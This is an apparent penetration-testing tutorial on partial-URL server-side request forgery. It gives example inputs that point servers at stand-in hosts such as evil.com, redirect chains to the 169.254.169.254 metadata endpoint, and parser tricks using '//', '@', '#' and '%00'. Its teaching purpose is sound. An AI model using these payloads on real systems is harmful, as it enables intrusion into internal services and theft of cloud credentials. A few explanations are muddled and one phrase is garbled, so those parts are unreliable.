# Partial URLs in requests


---

## The core problem

You control **only a piece** of the final URL, not the whole thing.

Example final URL constructed by server:

```
https://api.internal.company.com/v2/users/{username}/avatar
                           ↑                           ↑
                      fixed by server           user controls just this part
```

You can't change `https://api.internal.company.com/v2/users/` — only what goes inside `{username}`.

At first glance: *"So what? I can't make the server visit a完全不同 的网站."*

But attackers are clever. Here's how partial control can still become full SSRF.

---

## Scenario 1: You control the hostname (but not the path or protocol)

The app does:

```
GET_PICTURE?server=img-server.internal
```

Server builds: `https://{server}.company.com/images/logo.png`

You send: `GET_PICTURE?server=evil.com`

Server builds: `https://evil.com.company.com/images/logo.png`

Wait — that's not `https://evil.com/`. It's `evil.com.company.com`. That's still inside `*.company.com`.  
**You lost**, right? Not necessarily.

If the company uses **wildcard DNS** or **internal domain resolvers** that treat anything ending with `.company.com` as internal, yes, you're stuck.

But if the server **doesn't validate** that the final URL stays within company domains, and simply concatenates strings, you might try:

`GET_PICTURE?server=evil.com@`

Result: `https://evil.com@.company.com/images/logo.png`

Some HTTP libraries will interpret `user@host` — here `evil.com` becomes the **user** part, and the host is still `.company.com`. No good.

Better trick: What if you use **URL encoding** or **redirects**?  
If the server follows redirects, you give it:

`GET_PICTURE?server=legit.company.com`

But `legit.company.com` is actually a server **you control** that responds with:

```
HTTP/1.1 302 Redirect
Location: http://169.254.169.254/
```

Now the server obediently visits the internal metadata endpoint.  
You controlled only the *subdomain*, but through redirects, you achieved full SSRF.

---

## Scenario 2: You control the path (not the host or protocol)

Example:

```
FETCH_DOC?doc_id=123
```

Server builds: `https://docs.internal.company.com/{doc_id}.pdf`

You send: `FETCH_DOC?doc_id=../../../../etc/passwd`

But wait — the server is fetching `https://docs.internal/../../../../etc/passwd`, not `file:///etc/passwd`. HTTP doesn't do path traversal like that, right?

Right. But what if the server uses a **file-based** or **merging** system that *does* interpret `..`? Unlikely.  

Instead, try:

`FETCH_DOC?doc_id=@evil.com/anything`

Result: `https://docs.internal.company.com/@evil.com/anything.pdf`

That's still on `docs.internal.company.com`. No escape.

The real danger here is if the server **normalizes the URL** or uses a **different protocol handler**.

Some libraries support `https://host/path@evil.com` — the `@` symbol can split userinfo from host. But again, limited.

Stronger attack: Path-based SSRF works if the server **resolves relative paths against a base URL *after* constructing the full URL**, and you can inject `//` to override the host.

Example:

Server builds: `https://internal.api/{user_input}`

You input: `//evil.com/`

Result: `https://internal.api//evil.com/`

Some parsers will treat `//evil.com/` as a new host. Now you've escaped.

---

## Scenario 3: You control a parameter used inside the *request body* of the server's outgoing request

This is subtle.

App has an internal API:  
`POST /internal/make-payment`  
Body: `{"account": "user123", "amount": 100}`

You control `account` field via user input on a public form: `account=user123`

But the server itself, when forwarding your request, constructs:

```
POST http://payment.internal/charge
Host: payment.internal
{"target": "http://callback-server/{account}"}
```

Now your `account` value ends up inside the *second* request's URL. You still don't control the full URL of the *first* request, but the *second* request's URL is partially controlled.

If you set `account=http://evil.com/`, maybe you get:

`{"target": "http://callback-server/http://evil.com/"}`

Again, depends on parsing. But if `callback-server` is buggy, that could be exploited.

---

## Scenario 4: You control only a *numeric IP* or *port*

Example:  
`CHECK_PORT?ip=10.0.0.1&port=8080`

Server builds: `http://{ip}:{port}/status`

You try: `ip=169.254.169.254&port=80`

Now you've scanned the metadata service. Partial control of *ip* is enough for SSRF because you don't need full URL — you just need to reach an internal IP.

Similarly, if you control only the port: `port=22` (SSH) — not HTTP, but still an SSRF-like behavior (port scanning).

---

## The real danger of partial control

It's not that you'll directly request `http://evil.com/` when you only control a subdomain or path.  
It's that:

1. **Redirection** — the server follows redirects, so your partial control leads to a full redirect to your target.
2. **Parser differences** — how the server's HTTP library parses URLs vs. how you expect.
3. **Protocol smuggling** — injecting `@`, `#`, `?`, `;`, `%0d%0a` to change URL interpretation.
4. **Second-order requests** — your partial input gets inserted into a different, more powerful request later.

---

## Real example: Partial hostname control

Imagine an image proxy:  
`/proxy?domain=images.example.com`  
Server fetches: `http://images.example.com/static/icon.png`

You try: `/proxy?domain=evil.com`

Server fetches: `http://evil.com/static/icon.png` — but the app checks that `domain` ends with `example.com`.

So you try: `/proxy?domain=evil.com.example.com`

If the company owns `evil.com.example.com` (they don't), fails. But if they use **suffix matching** poorly, maybe `evil.com#.example.com` works because `#` terminates hostname in some parsers.

Better: `domain=evil.com%00.example.com` — null byte tricks older C libraries into stopping at `%00`, so host becomes `evil.com`.

---

## Summary table: Partial control and how to exploit

| You control | Example constructed URL | Exploitation trick |
|-------------|------------------------|---------------------|
| Subdomain | `https://{user}.internal.com/` | Redirects, DNS rebinding, `@` tricks |
| Path | `https://internal.com/{user}` | Inject `//evil.com/`, use `..` if file-based |
| Query param | `https://internal.com/search?q={user}` | Inject `?` to override query, or use redirects |
| IP / Port | `http://{ip}:{port}/` | Direct access to internal services, metadata |
| Filename | `https://internal.com/files/{user}` | Try `file://` if server supports multiple protocols |

---

## Practical advice for testers

If you see a request parameter that isn't a full URL, ask:

1. **Can I make the server follow a redirect** to a URL I fully control?
2. **Does the server use a lax URL parser** that lets me inject `//`, `@`, `#`, `%00`?
3. **Is my input used in more than one place** — maybe a later request with more control?
4. **Can I change the protocol** if the server supports `file://`, `gopher://`, `dict://` even partially?

And always, always test with an **out-of-band (OOB) listener** (like Burp Collaborator or webhook.site) — even if the response doesn't show the request succeeded, your server might still receive a visit.

Hidden SSRF isn't just about full URLs. Sometimes a tiny piece of control is all you need.